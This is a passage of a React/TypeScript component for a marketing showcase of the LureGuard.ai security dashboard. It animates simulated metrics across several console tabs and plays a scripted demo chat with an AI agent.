        times.push(d.toLocaleTimeString([], { hour: 'numeric', minute: '2-digit' }));
      }
      setTimeLabels(times);
    }, 1200);

    return () => clearInterval(interval);
  }, [active]);

  const maxVal = 100;
  const svgWidth = 600;
  const svgHeight = 160;

  const pointsString = useMemo(() => {
    return dataPoints
      .map((val, idx) => {
        const x = (idx / (pointCount - 1)) * svgWidth;
        const y = svgHeight - (val / maxVal) * svgHeight;
        return `${x.toFixed(1)},${y.toFixed(1)}`;
      })
      .join(' ');
  }, [dataPoints]);

  const areaPath = useMemo(() => {
    if (!pointsString) return '';
    return `M 0,${svgHeight} L ${pointsString} L ${svgWidth},${svgHeight} Z`;
  }, [pointsString]);

  const secCyanPoints = useMemo(() => {
    return secCyan
      .map((val, idx) => {
        const x = (idx / (pointCount - 1)) * svgWidth;
        const y = svgHeight - (val / maxVal) * svgHeight;
        return `${x.toFixed(1)},${y.toFixed(1)}`;
      })
      .join(' ');
  }, [secCyan]);

  const secRosePoints = useMemo(() => {
    return secRose
      .map((val, idx) => {
        const x = (idx / (pointCount - 1)) * svgWidth;
        const y = svgHeight - (val / maxVal) * svgHeight;
        return `${x.toFixed(1)},${y.toFixed(1)}`;
      })
      .join(' ');
  }, [secRose]);

  const secEmeraldPoints = useMemo(() => {
    return secEmerald
      .map((val, idx) => {
        const x = (idx / (pointCount - 1)) * svgWidth;
        const y = svgHeight - (val / maxVal) * svgHeight;
        return `${x.toFixed(1)},${y.toFixed(1)}`;
      })
      .join(' ');
  }, [secEmerald]);

  const currentRate = dataPoints[dataPoints.length - 1]?.toFixed(1) || '32.4';

  return (
    <div className=" border border-slate-200/80 dark:border-[#212832] bg-slate-100/80 dark:bg-[#0d1117] p-4 sm:p-5 transition-colors duration-300">
      <div className="flex items-center justify-between mb-4">
        <div className="flex items-center gap-2">
          <Cpu className="w-4 h-4 text-amber-600 dark:text-amber-400" />
          <h4 className="text-xs sm:text-sm font-mono font-bold text-slate-800 dark:text-slate-200 tracking-wide">
            Fleet CPU load
          </h4>
        </div>
        <div className="flex items-center gap-2.5 text-xs font-mono">
          <span className="text-slate-500 dark:text-[#6b7686]">Avg Load:</span>
          <span className="text-amber-600 dark:text-amber-400 font-bold tabular-nums">
            {currentRate}%
          </span>
        </div>
      </div>

      <div className="relative flex items-stretch">
        <div className="flex flex-col justify-between text-[10px] sm:text-[11px] font-mono text-slate-500 dark:text-[#5a6578] pr-3 select-none shrink-0 h-28 text-right">
          <span>100.0%</span>
          <span>66.7%</span>
          <span>33.3%</span>
          <span>0.0%</span>
        </div>

        <div className="relative flex-1 h-28 overflow-hidden rounded-sm">
          <div className="absolute inset-0 flex flex-col justify-between pointer-events-none z-0">
            <div className="border-b border-dashed border-slate-300/60 dark:border-[#1e2736]/80 h-0" />
            <div className="border-b border-dashed border-slate-300/60 dark:border-[#1e2736]/80 h-0" />
            <div className="border-b border-dashed border-slate-300/60 dark:border-[#1e2736]/80 h-0" />
            <div className="border-b border-dashed border-slate-300/60 dark:border-[#1e2736]/80 h-0" />
          </div>

          <svg
            viewBox={`0 0 ${svgWidth} ${svgHeight}`}
            className="w-full h-full overflow-visible relative z-10"
            preserveAspectRatio="none"
          >
            <defs>
              <linearGradient id="cpuFillGrad" x1="0" y1="0" x2="0" y2="1">
                <stop offset="0%" stopColor="#f59e0b" stopOpacity="0.26" />
                <stop offset="100%" stopColor="#f59e0b" stopOpacity="0.02" />
              </linearGradient>
            </defs>

            <path d={areaPath} fill="url(#cpuFillGrad)" />

            <polyline points={secCyanPoints} fill="none" stroke="#06b6d4" strokeWidth="1.2" strokeOpacity="0.75" />
            <polyline points={secRosePoints} fill="none" stroke="#f43f5e" strokeWidth="1.2" strokeOpacity="0.75" />
            <polyline points={secEmeraldPoints} fill="none" stroke="#10b981" strokeWidth="1.2" strokeOpacity="0.75" />

            <polyline
              points={pointsString}
              fill="none"
              stroke="#f59e0b"
              strokeWidth="2.2"
              strokeLinecap="round"
              strokeLinejoin="round"
              className="transition-all duration-300"
            />
          </svg>
        </div>
      </div>

      <div className="flex justify-between pl-14 pt-2 text-[10px] sm:text-[11px] font-mono text-slate-500 dark:text-[#5a6578] select-none">
        {timeLabels.map((time, idx) => (
          <span key={idx}>{time}</span>
        ))}
      </div>
    </div>
  );
}

function AgentPanel({ active }: { active: boolean }) {
  const activeAgents = useLiveNumber(214, { min: 210, max: 220, step: 1, active, intervalMs: 3200 });
  const heartbeat = useLiveNumber(12, { min: 8, max: 18, step: 2, active, intervalMs: 2000 });
  const cpu = useLiveNumber(18, { min: 12, max: 26, step: 2, active, intervalMs: 1800 });
  const probes = useLiveNumber(37, { min: 34, max: 40, step: 1, active, intervalMs: 4000 });

  return (
    <div className="space-y-5">
      <div className="grid grid-cols-2 sm:grid-cols-4 gap-3">
        <StatCard icon={Zap} label="Active Agents" value={activeAgents} tone="cyan" />
        <StatCard icon={Wifi} label="Avg Heartbeat" value={(heartbeat / 10).toFixed(1)} suffix="s" tone="blue" />
        <StatCard icon={Cpu} label="Avg CPU" value={cpu} suffix="%" tone="amber" />
        <StatCard icon={Radio} label="Probes Running" value={probes} tone="cyan" />
      </div>
      <div className="grid lg:grid-cols-2 gap-4">
        <AgentList active={active} />
        <div className="space-y-4">
          <FleetCpuLoadChart active={active} />
          <ProbeList />
        </div>
      </div>
    </div>
  );
}

function PosturePanel({ active }: { active: boolean }) {
  const score = useLiveNumber(92, { min: 90, max: 94, step: 1, active, intervalMs: 5000 });
  const critical = useLiveNumber(4, { min: 2, max: 6, step: 1, active, intervalMs: 6000 });
  const findings = useLiveNumber(27, { min: 24, max: 31, step: 1, active, intervalMs: 3500 });
  const exposed = useLiveNumber(6, { min: 4, max: 8, step: 1, active, intervalMs: 4500 });

  return (
    <div className="space-y-5">
      <div className="grid grid-cols-2 sm:grid-cols-4 gap-3">
        <StatCard icon={ShieldCheck} label="Compliance Score" value={score} suffix="%" tone="cyan" />
        <StatCard icon={AlertTriangle} label="Critical CVEs" value={critical} tone="red" />
        <StatCard icon={Search} label="SCA Findings" value={findings} tone="amber" />
        <StatCard icon={Eye} label="Exposed Assets" value={exposed} tone="blue" />
      </div>
      <div className="grid lg:grid-cols-2 gap-4">
        <EventFeed pool={POSTURE_POOL} active={active} />
        <BarGroup
          title="Posture by Category"
          active={active}
          items={[
            { label: 'Network Security', value: 88, tone: 'cyan' },
            { label: 'Identity & Access', value: 76, tone: 'amber' },
            { label: 'Container Hardening', value: 94, tone: 'cyan' },
            { label: 'Secrets Management', value: 61, tone: 'red' },
          ]}
        />
      </div>
    </div>
  );
}

function InvestigationPanel({ active }: { active: boolean }) {
  const open = useLiveNumber(3, { min: 2, max: 5, step: 1, active, intervalMs: 6000 });
  return (
    <div className="space-y-5">
      <div className="grid grid-cols-2 sm:grid-cols-4 gap-3">
        <StatCard icon={Search} label="Open Investigations" value={open} tone="amber" />
        <StatCard icon={Clock} label="Time to Contain" value="4m 12s" tone="cyan" />
        <StatCard icon={Database} label="Evidence Items" value={128} tone="blue" />
        <StatCard icon={CheckCircle2} label="Confidence" value={96} suffix="%" tone="cyan" />
      </div>
      <div className="grid lg:grid-cols-2 gap-4">
        <InvestigationTimeline active={active} />
        <IOCList />
      </div>
    </div>
  );
}

function ExplorerPanel({ active }: { active: boolean }) {
  const perSec = useLiveNumber(1840, { min: 1700, max: 2000, step: 40, active, intervalMs: 1200 });
  return (
    <div className="space-y-5">
      <div className="grid grid-cols-2 sm:grid-cols-4 gap-3">
        <StatCard icon={Terminal} label="Logs / sec" value={perSec} tone="cyan" />
        <StatCard icon={Database} label="Sources" value={14} tone="blue" />
        <StatCard icon={Clock} label="Retention" value={30} suffix="d" tone="amber" />
        <StatCard icon={Server} label="Storage Used" value="2.4" suffix="TB" tone="blue" />
      </div>
      <TerminalLog active={active} />
    </div>
  );
}

function FleetPanel({ active }: { active: boolean }) {
  const hosts = useLiveNumber(342, { min: 338, max: 348, step: 1, active, intervalMs: 4000 });
  const sessions = useLiveNumber(58, { min: 50, max: 66, step: 2, active, intervalMs: 2500 });
  return (
    <div className="space-y-5">
      <div className="grid grid-cols-2 sm:grid-cols-4 gap-3">
        <StatCard icon={Server} label="Total Hosts" value={hosts} tone="cyan" />
        <StatCard icon={Database} label="Cloud" value="61%" tone="blue" />
        <StatCard icon={Server} label="On-Prem" value="39%" tone="amber" />
        <StatCard icon={Wifi} label="Active Sessions" value={sessions} tone="cyan" />
      </div>
      <div className="grid lg:grid-cols-2 gap-4">
        <HostList active={active} />
        <BarGroup
          title="OS Distribution"
          active={active}
          items={[
            { label: 'Ubuntu 22.04', value: 47, tone: 'cyan' },
            { label: 'Debian 12', value: 24, tone: 'blue' },
            { label: 'Alpine', value: 18, tone: 'amber' },
            { label: 'Windows Server', value: 11, tone: 'red' },
          ]}
        />
      </div>
    </div>
  );
}

function AssetsPanel({ active }: { active: boolean }) {
  const pods = useLiveNumber(86, { min: 82, max: 90, step: 1, active, intervalMs: 3500 });
  const scanned = useLiveNumber(214, { min: 210, max: 220, step: 1, active, intervalMs: 4000 });
  const drift = useLiveNumber(3, { min: 1, max: 5, step: 1, active, intervalMs: 5000 });
  const alerts = useLiveNumber(7, { min: 4, max: 10, step: 1, active, intervalMs: 3000 });
  return (
    <div className="space-y-5">
      <div className="grid grid-cols-2 sm:grid-cols-4 gap-3">
        <StatCard icon={Package} label="Pods Running" value={pods} tone="cyan" />
        <StatCard icon={Search} label="Images Scanned" value={scanned} tone="blue" />
        <StatCard icon={AlertTriangle} label="Drift Detected" value={drift} tone="amber" />
        <StatCard icon={Radio} label="Runtime Alerts" value={alerts} tone="red" />
      </div>
      <div className="grid lg:grid-cols-2 gap-4">
        <ContainerGrid />
        <EventFeed pool={ASSETS_POOL} active={active} max={5} height="h-[260px]" />
      </div>
    </div>
  );
}

/* ============================================================
   Window chrome — mac dots + status bar + a real ticking clock
   ============================================================ */

function LiveClock({ active }: { active: boolean }) {
  const [now, setNow] = useState(() => new Date());
  useEffect(() => {
    if (!active) return;
    const id = setInterval(() => setNow(new Date()), 1000);
    return () => clearInterval(id);
  }, [active]);
  const hh = String(now.getHours()).padStart(2, '0');
  const mm = String(now.getMinutes()).padStart(2, '0');
  const ss = String(now.getSeconds()).padStart(2, '0');
  return (
    <span className="text-[10px] font-mono text-slate-500 dark:text-[#4d5766] tabular-nums">
      {hh}:{mm}:{ss} UTC
    </span>
  );
}

const OPENCODE_EXCHANGES = [
  {
    prompt: 'Read skills/triage.md and triage alerts from the last 2 hours',
    response: '3 SSH brute-force bursts contained · 1 credential stuffing sweep flagged for review',
  },
  {
    prompt: 'Enrich the IP behind the last blocked session',
    response: '185.220.101.5 → TOR exit node · AbuseIPDB score 98 · 214 reports',
  },
  {
    prompt: 'Draft an incident report for #9C347A',
    response: 'Report generated · attack chain, IOCs, and remediation steps attached',
  },
];

function OpencodeLogo() {
  return (
    <div className="flex flex-col items-center justify-center my-3 select-none">
      <svg
        xmlns="http://www.w3.org/2000/svg"
        width="641"
        height="115"
        viewBox="0 0 641 115"
        fill="none"
        className="h-9 sm:h-12 w-auto overflow-visible drop-shadow-[0_0_12px_rgba(255,255,255,0.15)]"
      >
        <g clipPath="url(#clip0_1401_86292)">
          <mask
            id="mask0_1401_86292"
            style={{ maskType: 'luminance' }}
            maskUnits="userSpaceOnUse"
            x="0"
            y="0"
            width="641"
            height="115"
          >
            <path d="M640.714 0H0V115H640.714V0Z" fill="white" />
          </mask>
          <g mask="url(#mask0_1401_86292)">
            <path d="M49.2868 82.1433H16.4297V49.2861H49.2868V82.1433Z" fill="#4B4646" />
            <path d="M49.2857 32.8573H16.4286V82.143H49.2857V32.8573ZM65.7143 98.5716H0V16.4287H65.7143V98.5716Z" fill="#B7B1B1" />
            <path d="M131.427 82.1433H98.5703V49.2861H131.427V82.1433Z" fill="#4B4646" />
            <path d="M98.5692 82.143H131.426V32.8573H98.5692V82.143ZM147.855 98.5716H98.5692V115H82.1406V16.4287H147.855V98.5716Z" fill="#B7B1B1" />
            <path d="M229.997 65.7139V82.1424H180.711V65.7139H229.997Z" fill="#4B4646" />
            <path d="M230.003 65.7144H180.718V82.143H230.003V98.5716H164.289V16.4287H230.003V65.7144ZM180.718 49.2859H213.575V32.8573H180.718V49.2859Z" fill="#B7B1B1" />
            <path d="M295.717 98.5718H262.859V49.2861H295.717V98.5718Z" fill="#4B4646" />
            <path d="M295.715 32.8573H262.858V98.5716H246.43V16.4287H295.715V32.8573ZM312.144 98.5716H295.715V32.8573H312.144V98.5716Z" fill="#B7B1B1" />
            <path d="M394.286 82.1433H345V49.2861H394.286V82.1433Z" fill="#4B4646" />
            <path d="M394.285 32.8573H344.999V82.143H394.285V98.5716H328.57V16.4287H394.285V32.8573Z" fill="#F1ECEC" />
            <path d="M459.998 82.1433H427.141V49.2861H459.998V82.1433Z" fill="#4B4646" />
            <path d="M459.997 32.8573H427.14V82.143H459.997V32.8573ZM476.425 98.5716H410.711V16.4287H476.425V98.5716Z" fill="#F1ECEC" />
            <path d="M542.146 82.1433H509.289V49.2861H542.146V82.1433Z" fill="#4B4646" />
            <path d="M542.145 32.8571H509.288V82.1429H542.145V32.8571ZM558.574 98.5714H492.859V16.4286H542.145V0H558.574V98.5714Z" fill="#F1ECEC" />
            <path d="M640.715 65.7139V82.1424H591.43V65.7139H640.715Z" fill="#4B4646" />
            <path d="M591.429 32.8573V49.2859H624.286V32.8573H591.429ZM640.714 65.7144H591.429V82.143H640.714V98.5716H575V16.4287H640.714V65.7144Z" fill="#F1ECEC" />
          </g>
        </g>
        <defs>
          <clipPath id="clip0_1401_86292">
            <rect width="640.714" height="115" fill="white" />
          </clipPath>
        </defs>
      </svg>
    </div>
  );
}

/* Terminal-style live chat: types a prompt, then the agent's reply,
   pauses, then cycles to the next example — loops while `active`. */
function OpencodeChat({ active }: { active: boolean }) {
  const [exchangeIndex, setExchangeIndex] = useState(0);
  const [promptLen, setPromptLen] = useState(0);
  const [responseLen, setResponseLen] = useState(0);
  const [showResponse, setShowResponse] = useState(false);

  const prompts = [
    'What is the tech stack of this project?',
    'Read skills/triage.md and triage alerts from last 2 hours',
    'Enrich the IP behind the last blocked session',
    'Draft an executive security report for incident #9C347A',
  ];

  const responses = [
    'LureGuard.ai is powered by Astro, React 19, Motion, and opencode AI agents.',
    '3 SSH brute-force bursts contained · 1 credential stuffing sweep flagged.',
    '185.220.101.5 → TOR exit node · AbuseIPDB score 98 · 214 reports',
    'Report generated · attack chain, IOCs, and remediation steps attached.',
  ];

  useEffect(() => {
    if (!active) return;
    let cancelled = false;
    const timers: ReturnType<typeof setTimeout>[] = [];
    const currentPrompt = prompts[exchangeIndex];

    setPromptLen(0);
    setResponseLen(0);
    setShowResponse(false);

    let i = 0;
    const typePrompt = () => {
      const t = setTimeout(() => {
        if (cancelled) return;
        i++;
        setPromptLen(i);
        if (i < currentPrompt.length) typePrompt();
        else timers.push(setTimeout(startResponse, 600));
      }, 24);
      timers.push(t);
    };

    const startResponse = () => {
      if (cancelled) return;
      setShowResponse(true);
      let j = 0;
      const typeResponse = () => {
        const t = setTimeout(() => {
          if (cancelled) return;
          j++;
          setResponseLen(j);
          if (j < responses[exchangeIndex].length) typeResponse();
          else
            timers.push(
              setTimeout(() => {
                if (cancelled) return;
                setExchangeIndex((idx) => (idx + 1) % prompts.length);
              }, 2500)
            );
        }, 16);
        timers.push(t);
      };
      typeResponse();
    };

    typePrompt();

    return () => {
      cancelled = true;
      timers.forEach(clearTimeout);
    };
  }, [active, exchangeIndex]);

  const currentPrompt = prompts[exchangeIndex];
  const currentResponse = responses[exchangeIndex];

  return (
    <div className="relative  border border-slate-300/80 dark:border-[#27272a] bg-slate-950 dark:bg-[#09090b] text-white overflow-hidden p-6 sm:p-8 flex flex-col items-center justify-between min-h-[340px] font-mono select-none transition-colors duration-300">
      {/* Top Opencode Block Pixel Logo matching Image */}
      <OpencodeLogo />

      {/* Center Search / Prompt Input Box matching Image */}
      <div className="w-full max-w-xl my-3">
        <div className="relative bg-[#18181b] dark:bg-[#131316] border border-[#27272a] rounded-md p-3.5 sm:p-4 shadow-xl flex items-stretch gap-3">
          {/* Blue Vertical Indicator Line on Left */}
          <div className="w-1 bg-cyan-500 dark:bg-blue-500 rounded-full shrink-0" />

          <div className="flex-1 space-y-2 text-left min-w-0">
            {/* Top Prompt Line with Hollow Cursor */}
            <div className="flex items-center gap-2 text-xs sm:text-sm text-slate-300 font-mono overflow-hidden">
              <span className="inline-block w-2.5 h-4 border border-white/80 bg-white/20 animate-pulse shrink-0" />
              <span className="text-slate-400 shrink-0">Ask anything...</span>
              <span className="text-white font-medium truncate">
                "{currentPrompt.slice(0, promptLen)}"
              </span>
            </div>

            {/* Sub-line Modes: Build . Big Pickle OpenCode Zen */}
            <div className="flex items-center gap-2 text-[11px] font-mono text-slate-400 border-t border-[#27272a]/60 pt-2">
              <span className="text-cyan-400 dark:text-blue-400 font-bold">Build</span>
              <span className="text-slate-600">·</span>
              <span className="font-bold text-white">Big Pickle</span>
              <span className="text-slate-500">OpenCode Zen</span>
            </div>
          </div>
        </div>

        {/* Shortcuts Bar Below Box */}
        <div className="flex items-center justify-between text-[11px] font-mono text-slate-500 dark:text-[#71717a] mt-2.5 px-1">
          <div className="flex items-center gap-3">
            <span><strong className="text-slate-300 font-semibold">tab</strong> agents</span>
            <span><strong className="text-slate-300 font-semibold">ctrl+p</strong> commands</span>
          </div>
        </div>

        {/* Live Agent Output Response Card */}
        {showResponse && (
          <motion.div
            initial={{ opacity: 0, y: 6 }}
            animate={{ opacity: 1, y: 0 }}
            className="mt-3.5 p-3 rounded-lg bg-[#18181b]/90 border border-[#27272a] text-left text-xs font-mono"
          >
            <div className="flex items-start gap-2">
              <span className="text-emerald-400 font-bold shrink-0">[agent]</span>
              <span className="text-slate-300">
                {currentResponse.slice(0, responseLen)}
                {responseLen < currentResponse.length && (
                  <span className="inline-block w-1.5 h-3 bg-emerald-400 ml-0.5 align-middle animate-pulse" />
                )}
              </span>
            </div>
          </motion.div>
        )}
      </div>

      {/* Bottom Footer Info: ~ on left, version 1.18.5 on right */}
      <div className="w-full flex items-center justify-between text-[10px] font-mono text-slate-600 dark:text-[#52525b] pt-2">
        <span>~</span>
        <span>1.18.5</span>
      </div>
    </div>
  );
}

/* Static-ish list of the skills/*.md files opencode can invoke */
function SkillsList() {
  const skills = [
    { name: 'triage.md', desc: 'Correlates alerts, ranks by severity' },
    { name: 'enrich.md', desc: 'IOC lookups · VirusTotal, AbuseIPDB' },
    { name: 'contain.md', desc: 'Blocks IPs, syncs firewall rules' },
    { name: 'report.md', desc: 'Generates incident write-ups' },
  ];
  return (
    <div className="border border-slate-200/80 dark:border-[#212832] bg-slate-100/80 dark:bg-[#0d1117] divide-y divide-slate-200/80 dark:divide-[#161c26] overflow-hidden transition-colors duration-300">
      <div className="px-4 py-3 border-b border-slate-200/80 dark:border-[#1a2029]">
        <h4 className="text-[11px] font-mono tracking-[0.14em] text-slate-500 dark:text-[#6b7686] uppercase">Skills Library</h4>
      </div>
      {skills.map((s) => (
        <div key={s.name} className="px-4 py-3 flex items-center gap-3">
          <span className="w-1.5 h-1.5 rounded-full bg-emerald-500 dark:bg-[#35d399] animate-pulse flex-shrink-0" />
          <div className="min-w-0">
            <span className="text-xs font-mono text-slate-800 dark:text-[#c3cad6] block">{s.name}</span>
            <span className="text-[10px] font-mono text-slate-500 dark:text-[#4d5766] block truncate">{s.desc}</span>
          </div>
          <span className="ml-auto text-[9px] font-mono text-emerald-600 dark:text-[#35d399] font-bold flex-shrink-0">READY</span>
        </div>
      ))}
    </div>
  );
}

/* The tab panel itself — same shape as SocPanel / AgentPanel / etc. */
function OpencodePanel({ active }: { active: boolean }) {
  const sessions = useLiveNumber(6, { min: 3, max: 10, step: 1, active, intervalMs: 4000 });
  const commands = useLiveNumber(47, { min: 42, max: 55, step: 1, active, intervalMs: 3000 });

  return (
    <div className="space-y-5">
      <div className="grid grid-cols-2 sm:grid-cols-4 gap-3">
        <StatCard icon={MessageSquare} label="Active Sessions" value={sessions} tone="green" />
        <StatCard icon={BookOpen} label="Skills Loaded" value={12} tone="blue" />
        <StatCard icon={Zap} label="Avg Response" value="1.8" suffix="s" tone="amber" />
        <StatCard icon={Terminal} label="Commands Today" value={commands} tone="green" />
      </div>
      <div className="grid lg:grid-cols-2 gap-4">
        <OpencodeChat active={active} />
        <SkillsList />
      </div>
    </div>
  );
}

/* ============================================================
   Tab registry
   ============================================================ */

const TABS = [
  { id: 'opencode', label: 'opencode CLI', icon: MessageSquare },
  { id: 'soc', label: 'SOC Overview', icon: Shield },
  { id: 'agent', label: 'Agent Activity', icon: Zap },
  { id: 'posture', label: 'Security Posture', icon: ShieldCheck },
  { id: 'investigation', label: 'Investigation', icon: Search },
  { id: 'explorer', label: 'Log Explorer', icon: Terminal },
  { id: 'fleet', label: 'Fleet & Hosts', icon: Server },
  { id: 'assets', label: 'Containers & Assets', icon: Package },
] as const;

type TabId = (typeof TABS)[number]['id'];

/* ============================================================
   Root component (Full Light & Dark Theme Responsive)
   ============================================================ */

export default function LureGuardDashboardShowcase() {
  const [activeTab, setActiveTab] = useState<TabId>('opencode');
  const [rootRef, visible] = useVisible<HTMLElement>();
  const tabRefs = useRef<Record<string, HTMLButtonElement | null>>({});
  const [underline, setUnderline] = useState({ left: 0, width: 0 });

  useLayoutEffect(() => {
    const el = tabRefs.current[activeTab];
    if (el) setUnderline({ left: el.offsetLeft, width: el.offsetWidth });
  }, [activeTab]);

  const activeLabel = TABS.find((t) => t.id === activeTab)?.label ?? '';

  return (
    <section ref={rootRef} className="relative bg-white dark:bg-[#0a0a0d] py-20 px-4 sm:px-8 transition-colors duration-300">
      <style>{`
        @keyframes tic-arrive {
          0% { opacity: 0; transform: translateY(-6px); }
          100% { opacity: 1; transform: translateY(0); }
        }
        .tic-arrive { animation: tic-arrive 0.4s ease-out both; }
        .scrollbar-hide::-webkit-scrollbar { display: none; }
        .scrollbar-hide { -ms-overflow-style: none; scrollbar-width: none; }
      `}</style>

      <motion.div
        initial={{ opacity: 0, y: 20 }}
        whileInView={{ opacity: 1, y: 0 }}
        viewport={{ once: true, margin: '-50px' }}
        transition={{ duration: 0.5, ease: 'easeOut' }}
        className="max-w-[1360px] mx-auto"
      >
        {/* Section header */}
        <SectionHeader
          tag="Live product preview"
          title="One console. Every signal."
          subtitle="Explore the dashboards your SOC team will actually live in — updating in real time, right here."
          align="center"
        />

        {/* Dashboard window */}
        <div className="border border-slate-200/90 dark:border-[#212832] bg-white/95 dark:bg-[#0c0f15]/95 backdrop-blur-xl overflow-hidden transition-colors duration-300">
          <div className="flex items-center gap-2 px-5 py-3 border-b border-slate-200 dark:border-[#1a2029] bg-slate-100/90 dark:bg-[#0d1117]">
            <span className="w-2.5 h-2.5 rounded-full bg-rose-400/70 dark:bg-[#4a3038]" />
            <span className="w-2.5 h-2.5 rounded-full bg-amber-400/70 dark:bg-[#4a4230]" />
            <span className="w-2.5 h-2.5 rounded-full bg-emerald-400/70 dark:bg-[#2e4a38]" />
            <span className="ml-3 text-[10px] font-mono text-slate-500 dark:text-[#6b7686] tracking-wider">
              lureguard.ai — {activeLabel}
            </span>
            <div className="ml-auto flex items-center gap-3">
              <span className="flex items-center gap-1.5 text-[10px] font-mono text-cyan-600 dark:text-cyan-400 font-semibold">
                <span className="w-1.5 h-1.5 rounded-full bg-cyan-500 dark:bg-cyan-400 animate-pulse" />
                production · live
              </span>
              <LiveClock active={visible} />
            </div>
          </div>

          {/* Window Body: Left Sidebar Navigation + Right Content View */}
          <div className="flex flex-col md:flex-row min-h-[580px] md:min-h-[630px]">
            {/* Left Navigation Sidebar */}
            <div className="w-full md:w-56 shrink-0 border-b md:border-b-0 md:border-r border-slate-200 dark:border-[#1a2029] bg-slate-100/70 dark:bg-[#090c10] p-2.5 flex md:flex-col gap-1 overflow-x-auto md:overflow-x-visible scrollbar-hide">
              <div className="hidden md:block px-3 py-2 text-[10px] font-mono uppercase tracking-widest text-slate-400 dark:text-[#4d5766]">
                Console Navigation
              </div>
              {TABS.map((tab) => {
                const Icon = tab.icon;
                const isActive = tab.id === activeTab;
                return (
                  <button
                    key={tab.id}
                    onClick={() => setActiveTab(tab.id)}
                    className={`flex items-center gap-2.5 px-3 py-2.5 rounded-lg text-xs font-mono whitespace-nowrap transition-all duration-200 cursor-pointer text-left ${
                      isActive
                        ? 'bg-cyan-500/10 text-cyan-600 dark:text-cyan-400 border border-cyan-500/30 font-semibold shadow-xs'
                        : 'text-slate-600 dark:text-[#7e8eb0] hover:text-slate-900 dark:hover:text-white hover:bg-slate-200/50 dark:hover:bg-[#121822] border border-transparent'
                    }`}
                  >
                    <Icon className={`w-4 h-4 shrink-0 ${isActive ? 'text-cyan-600 dark:text-cyan-400' : 'text-slate-400 dark:text-[#64748b]'}`} />
                    <span>{tab.label}</span>
                  </button>
                );
              })}
            </div>

            {/* Main Active Panel View (Consistent Height) */}
            <div className="flex-1 p-5 sm:p-6 bg-slate-50/50 dark:bg-transparent min-w-0 flex flex-col">
              <AnimatePresence mode="wait">
                <motion.div
                  key={activeTab}
                  initial={{ opacity: 0, y: 10 }}
                  animate={{ opacity: 1, y: 0 }}
                  exit={{ opacity: 0, y: -10 }}
                  transition={{ duration: 0.28, ease: 'easeOut' }}
                  className="flex-1 flex flex-col justify-between"
                >
                  {activeTab === 'opencode' && <OpencodePanel active={visible} />}
                  {activeTab === 'soc' && <SocPanel active={visible} />}
                  {activeTab === 'agent' && <AgentPanel active={visible} />}
                  {activeTab === 'posture' && <PosturePanel active={visible} />}
                  {activeTab === 'investigation' && <InvestigationPanel active={visible} />}
                  {activeTab === 'explorer' && <ExplorerPanel active={visible} />}
                  {activeTab === 'fleet' && <FleetPanel active={visible} />}
                  {activeTab === 'assets' && <AssetsPanel active={visible} />}
                </motion.div>
              </AnimatePresence>
            </div>
          </div>
        </div>
      </motion.div>
    </section>
  );
}

export { LureGuardDashboardShowcase };
